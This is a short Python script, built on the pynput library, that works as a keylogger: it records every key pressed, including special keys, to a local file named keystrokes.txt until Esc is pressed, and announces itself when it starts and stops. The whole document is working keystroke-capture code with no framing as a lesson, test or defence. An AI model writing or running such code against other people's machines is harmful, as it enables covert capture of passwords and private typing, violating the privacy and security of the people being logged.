from pynput import keyboard

# File to save the logged keystrokes
log_file = "keystrokes.txt"

def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press ESC to stop.")
    listener.join()

print("Keylogger stopped.")
